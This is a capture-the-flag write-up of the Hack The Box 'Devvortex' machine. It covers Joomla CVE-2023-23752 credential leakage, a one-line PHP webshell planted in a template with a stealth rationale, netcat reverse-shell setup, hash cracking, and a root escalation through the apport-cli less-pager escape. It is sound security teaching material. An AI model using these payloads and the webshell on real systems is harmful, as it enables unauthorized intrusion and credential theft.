---
title: "HTB: Devvortex"
date: 2026-03-10 19:00:00 +1100
categories: [HTB, Linux, Easy]
tags: [htb, linux, nmap, subdomain, joomla, cve-2023-23752, information-disclosure, mysql, hash-cracking, apport-cli, cve-2023-1326, less, pager-exploit]
toc: true
image:
  path: assets/img/htb/devvortex/devvortex-banner.png
  alt: HTB Devvortex Box
---

Devvortex is an easy Linux box featuring a vulnerable Joomla CMS with an information disclosure vulnerability (CVE-2023-23752) that leaks database credentials. After gaining admin access to Joomla, I upload a webshell to get initial access. Credentials found in the MySQL database allow lateral movement to the logan user. Privilege escalation exploits a vulnerable version of apport-cli (CVE-2023-1326) to escape from a pager and obtain a root shell.

## Box Info

<table class="box-info-table">
  <thead>
    <tr>
      <th>OS</th>
      <th>Difficulty</th>
      <th>Release Date</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Linux</td>
      <td>Easy</td>
      <td>25 Nov 2023</td>
    </tr>
  </tbody>
</table>



**Tools Used:** `nmap`, `ffuf`, `joomscan`, `curl`, `mysql`, `john`, `apport-cli`

## Attack Summary

- Discovered subdomain dev.devvortex.htb through VHOST enumeration
- Identified Joomla CMS version 4.2.6 on subdomain
- Exploited CVE-2023-23752 to leak MySQL credentials and user information
- Gained admin access to Joomla dashboard
- Uploaded webshell plugin for code execution
- Obtained reverse shell as www-data
- Dumped password hashes from MySQL database
- Cracked logan's bcrypt hash
- SSH'd as logan user
- Exploited CVE-2023-1326 in apport-cli to escalate privileges
- Escaped from less pager to obtain root shell

---

## Recon

### Initial Scan

I ran nmap to enumerate open ports and its versions:
```bash
sudo nmap -sC -sV 10.129.229.146
```

Found two open ports:
```java
PORT     STATE    SERVICE   VERSION
22/tcp   open     ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open     http      nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

Results showed:
- SSH: OpenSSH 8.2p1 Ubuntu
- HTTP: nginx 1.18.0 (redirects to http://devvortex.htb/)

Based on OpenSSH version, the target is likely running Ubuntu 20.04.

I added `devvortex.htb` to `/etc/hosts`:
```bash
echo "10.10.11.242 devvortex.htb" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

### Main Site - devvortex.htb

The main website is a static landing page for a web development company. Directory enumeration revealed only standard pages (about.html, contact.html, portfolio.html) with no interactive functionality.

![Main Website Screenshot](/assets/img/htb/devvortex/Devvortex01.png)

### Subdomain Discovery

I used ffuf to enumerate subdomains:
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://10.10.11.242 \
  -H "Host: FUZZ.devvortex.htb" \
  -ac
```

Found subdomain: `dev.devvortex.htb`

Added to `/etc/hosts`:
```bash
echo "10.10.11.242 dev.devvortex.htb" | sudo tee -a /etc/hosts
```

![Subdomain Website Screenshot](/assets/img/htb/devvortex/Devvortex02.png)

### Development Site - dev.devvortex.htb

I checked `/robots.txt` and found some directory on the subdomain.


![Robot.txt Screenshot](/assets/img/htb/devvortex/Devvortex03.png)

Interesting directory:

```
/administrator  - Joomla admin login
/api           - API endpoint
```

The `/administrator` page confirmed this is a Joomla CMS installation.

![Admin login Screenshot](/assets/img/htb/devvortex/Devvortex04.png)

---

## Joomla Enumeration

### Version Detection

I used joomscan to fingerprint the Joomla version:

```bash
joomscan --url http://dev.devvortex.htb/
```

![Admin login Screenshot](/assets/img/htb/devvortex/Devvortex07.png)


Detected version: **Joomla 4.2.6**

Alternatively, the version can be found at:

```
http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
```

![Admin login Screenshot](/assets/img/htb/devvortex/Devvortex06.png)

---

## CVE-2023-23752 Exploitation

### Information Disclosure Vulnerability

Joomla versions 4.0.0 through 4.2.7 are vulnerable to CVE-2023-23752, an unauthenticated information disclosure vulnerability in the API endpoints.

The vulnerability allows access to restricted API endpoints by adding `?public=true` to the query string.

**Reference Article** - [https://www.vulncheck.com/blog/joomla-for-rce](https://www.vulncheck.com/blog/joomla-for-rce)

### Leaking User Information

I queried the users API endpoint:
```bash
curl "http://dev.devvortex.htb/api/index.php/v1/users?public=true" | jq
```

Retrieved two users:
- **lewis** (Super User / Admin)
- **logan** (Registered user)

### Leaking Database Credentials

I queried the config/application endpoint:
```bash
curl "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq
```

Found MySQL credentials:
```
Database: joomla
User: lewis
Password: P4ntherg0t1n5r3c0n##
Host: localhost
```

---

## Shell as www-data

### Joomla Admin Access

The leaked MySQL password also worked for lewis's Joomla account:
```
Username: lewis
Password: P4ntherg0t1n5r3c0n##
```

![Admin login Screenshot](/assets/img/htb/devvortex/Devvortex13.png)

Logged into the Joomla administrator panel at `/administrator`.

### Remote Code Execution via Template Editing

With administrative access to Joomla, there are multiple paths to achieve remote code execution. Since we already had backend access, instead of uploading a plugin, I chose a more direct method: editing an existing **template file.**

Joomla allows administrators to modify template files directly from the dashboard:

```nginx
System → Site Templates → Cassiopeia → error.php
```

I chose to modify error.php instead of core layout files such as index.php. Since error.php is only rendered during application errors, modifying it reduces the risk of breaking normal site functionality and avoids drawing attention. Editing primary templates could potentially crash the entire site or lock me out of the admin panel if a syntax error were introduced.

![Editing template Screenshot](/assets/img/htb/devvortex/Devvortex18.png)

**Payload**

Add the payload and saved the file.

```php
system($_REQUEST['cmd']);
```

### Triggering Command Execution

Once saved, the webshell became accessible through the application. I tested it by executing:

```bash
http://dev.devvortex.htb/index.php?cmd=id
```

After confirming command execution, I proceeded to obtain a reverse shell.


### Reverse Shell

Start a listener:

```bash
nc -lvnp 9001
```

I executed the following payload via the cmd parameter:

![RCE Screenshot](/assets/img/htb/devvortex/Devvortex20.png)


I received a connection as `www-data`.

**Upgraded the shell:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Shell as logan

### MySQL Database Access

I connected to MySQL with the leaked credentials:
```bash
mysql -u lewis -p'P4ntherg0t1n5r3c0n##' joomla
```

Enumerated the users table:
```sql
show databases;
use joomla;
show tables;
describe sd4fg_users;
select name, username, password from sd4fg_users;
```

Found password hashes:

![Hash Screenshot](/assets/img/htb/devvortex/Devvortex24.png)

### Hash Cracking

I saved the hashes and cracked them with john:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Cracked logan's password: **tequieromucho**

### SSH as logan
```bash
ssh logan@devvortex.htb
# Password: tequieromucho
```

Got user flag:
```bash
cat user.txt
```

---

## Privilege Escalation

### Sudo Permissions

I checked logan's sudo privileges:

```bash
sudo -l
```

Output:
```
User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

### CVE-2023-1326

I checked the apport-cli version:
```bash
/usr/bin/apport-cli --version
# 2.20.11
```

This version is vulnerable to CVE-2023-1326, a privilege escalation vulnerability where apport-cli opens crash reports in the `less` pager, allowing escape to a shell.

**Reference POC** - [https://github.com/cve-2024/CVE-2023-1326-PoC](https://github.com/cve-2024/CVE-2023-1326-PoC)

### Creating a Crash Report

I generated a minimal crash report:
```bash
echo -e "ProblemType: Crash\nArchitecture: amd64" > /tmp/crash.report
```

### Exploiting apport-cli

I ran apport-cli with sudo:
```bash
sudo /usr/bin/apport-cli -c /tmp/crash.report
```

Selected **V** to view the report, which opened in `less`.

In the `less` pager, I typed:
```
!/bin/bash
```

This spawned a root shell:
```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

Got root flag:
```bash
cat /root/root.txt
```

---

## Remediation

**Short term:**
- Update Joomla to the latest patched version (>4.2.7)
- Remove dangerous sudo permissions for apport-cli
- Implement strong password policies
- Disable information disclosure via API

**Medium term:**
- Regular security updates and patch management
- Implement least privilege principle for sudo
- Password audits to prevent credential reuse
- Monitor for unauthorized file uploads